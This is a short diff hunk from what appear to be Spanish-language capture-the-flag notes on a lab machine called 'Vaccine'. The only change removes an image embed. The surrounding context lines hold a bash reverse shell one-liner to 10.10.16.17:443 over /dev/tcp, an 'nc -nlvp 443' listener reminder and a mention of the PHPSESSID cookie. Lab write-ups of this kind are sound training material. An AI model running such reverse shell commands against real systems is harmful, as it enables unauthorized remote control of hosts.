@@ -105,7 +105,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.16.17/443 0>&1'                 / Este es el 
 ```
 Recordar estar en escucha con [[nc -nlvp 443]] para la [[Reverse shell]]
 El cookie seria el value de PHPSESSID
-![[Pasted image 20250629144142.png]]
+
 
 ![[Vaccine14.png]]
 
